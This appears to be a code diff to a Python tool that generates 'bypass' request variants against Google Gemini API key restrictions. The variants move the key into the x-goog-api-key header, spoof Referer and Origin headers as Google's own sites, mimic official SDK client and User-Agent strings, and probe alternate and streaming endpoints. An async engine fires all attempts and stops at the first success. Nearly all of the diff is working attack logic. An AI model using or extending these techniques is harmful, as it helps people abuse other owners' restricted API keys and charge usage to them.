@@ -28,9 +28,13 @@ class BypassAttempt:
     endpoint: str = "models"
     method: str = "GET"
     body: str | None = None
+    key_in_header: bool = False
 
     def to_url(self, key: str) -> str:
-        return f"{GEMINI_BASE_URL}/{self.api_version}/{self.endpoint}?key={key}"
+        base = f"{GEMINI_BASE_URL}/{self.api_version}/{self.endpoint}"
+        if self.key_in_header:
+            return base
+        return f"{base}?key={key}"
 
     def to_curl(self, key: str) -> str:
         """Generate a curl command that reproduces this attempt."""
@@ -52,6 +56,7 @@ class BypassAttempt:
             method=self.method,
             body=self.body,
             curl_command="",  # Filled later with key
+            key_in_header=self.key_in_header,
         )
 
 
@@ -342,6 +347,157 @@ class ComboRefererEndpoint(BypassStrategy):
         ]
 
 
+@bypass_strategy
+class ApiKeyHeader(BypassStrategy):
+    """Bypass by sending key via x-goog-api-key header instead of query param."""
+
+    name = "api_key_header"
+
+    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
+        return [
+            BypassAttempt(
+                technique_name=f"{self.name}:{ver}",
+                headers={"x-goog-api-key": key},
+                api_version=ver,
+                key_in_header=True,
+            )
+            for ver in ("v1beta", "v1", "v1beta2", "v1beta3")
+        ]
+
+
+@bypass_strategy
+class StreamEndpoint(BypassStrategy):
+    """Bypass by targeting the streaming endpoint."""
+
+    name = "stream_endpoint"
+
+    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
+        body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
+        return [
+            BypassAttempt(
+                technique_name=f"{self.name}:{ver}",
+                endpoint=f"models/gemini-2.0-flash:streamGenerateContent",
+                method="POST",
+                body=body,
+                headers={"Content-Type": "application/json"},
+                api_version=ver,
+            )
+            for ver in ("v1beta", "v1")
+        ]
+
+
+@bypass_strategy
+class AlternateEndpoints(BypassStrategy):
+    """Bypass by trying less common API endpoints."""
+
+    name = "alt_endpoint"
+
+    ENDPOINTS = [
+        "tunedModels",
+        "cachedContents",
+        "files",
+        "corpora",
+    ]
+
+    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
+        return [
+            BypassAttempt(
+                technique_name=f"{self.name}:{ep}",
+                endpoint=ep,
+            )
+            for ep in self.ENDPOINTS
+        ]
+
+
+@bypass_strategy
+class ComboApiKeyHeaderReferer(BypassStrategy):
+    """Combo: x-goog-api-key header + Referer + Origin (triple bypass)."""
+
+    name = "combo_header_referer"
+
+    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
+        referers = [
+            "https://aistudio.google.com",
+            "https://console.cloud.google.com",
+            "https://ai.google.dev",
+        ]
+        attempts = []
+        for ref in referers:
+            attempts.append(
+                BypassAttempt(
+                    technique_name=f"{self.name}:{ref}",
+                    headers={
+                        "x-goog-api-key": key,
+                        "Referer": ref,
+                        "Origin": ref,
+                    },
+                    key_in_header=True,
+                )
+            )
+            # Also try with generateContent
+            body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
+            attempts.append(
+                BypassAttempt(
+                    technique_name=f"{self.name}:{ref}+generateContent",
+                    headers={
+                        "x-goog-api-key": key,
+                        "Referer": ref,
+                        "Origin": ref,
+                        "Content-Type": "application/json",
+                    },
+                    endpoint="models/gemini-2.0-flash:generateContent",
+                    method="POST",
+                    body=body,
+                    key_in_header=True,
+                )
+            )
+        return attempts
+
+
+@bypass_strategy
+class SdkHeaders(BypassStrategy):
+    """Bypass by mimicking official Google SDK client headers."""
+
+    name = "sdk_headers"
+
+    SDK_CLIENTS = [
+        "genai-js/0.21.0",
+        "gl-python/3.12.0 grpc/1.62.0 gax/2.24.0",
+        "genai-go/0.7.0",
+    ]
+
+    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
+        return [
+            BypassAttempt(
+                technique_name=f"{self.name}:{client.split('/')[0]}",
+                headers={"X-Goog-Api-Client": client},
+            )
+            for client in self.SDK_CLIENTS
+        ]
+
+
+@bypass_strategy
+class SdkUserAgent(BypassStrategy):
+    """Bypass by using official Google SDK User-Agent strings."""
+
+    name = "sdk_ua"
+
+    SDK_AGENTS = [
+        "google-api-python-client/2.149.0 (gzip)",
+        "gl-python/3.12 google-cloud-sdk/0.1",
+        "google-api-nodejs-client/9.14.0",
+    ]
+
+    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
+        return [
+            BypassAttempt(
+                technique_name=f"{self.name}:{ua.split('/')[0]}",
+                headers={"User-Agent": ua},
+            )
+            for ua in self.SDK_AGENTS
+        ]
+
+
 # --- Bypass engine ---
 
 
@@ -406,24 +562,25 @@ class BypassEngine:
                 except (httpx.HTTPError, Exception):
                     pass
 
-        # Fire all attempts, cancel on first hit
         tasks = [asyncio.create_task(try_attempt(a)) for a in attempts]
+        # found_waiter resolves on first bypass success;
+        # all_done resolves when every attempt finishes (no bypass found).
+        # We exit on whichever comes first (or timeout).
+        found_waiter = asyncio.create_task(found.wait())
+        all_done = asyncio.ensure_future(
+            asyncio.gather(*tasks, return_exceptions=True)
+        )
         try:
-            # Wait for all to finish or until we find a winner
-            done, pending = await asyncio.wait(
-                tasks,
+            await asyncio.wait(
+                {found_waiter, all_done},
                 timeout=BYPASS_TIMEOUT + 2,
-                return_when=asyncio.FIRST_EXCEPTION,
+                return_when=asyncio.FIRST_COMPLETED,
             )
-            # Check periodically if we got a winner
-            if not found.is_set():
-                await asyncio.wait(tasks, timeout=0.1)
         finally:
-            # Cancel any still running
+            found_waiter.cancel()
             for t in tasks:
                 if not t.done():
                     t.cancel()
-            # Suppress cancellation errors
             await asyncio.gather(*tasks, return_exceptions=True)
 
         if winner:
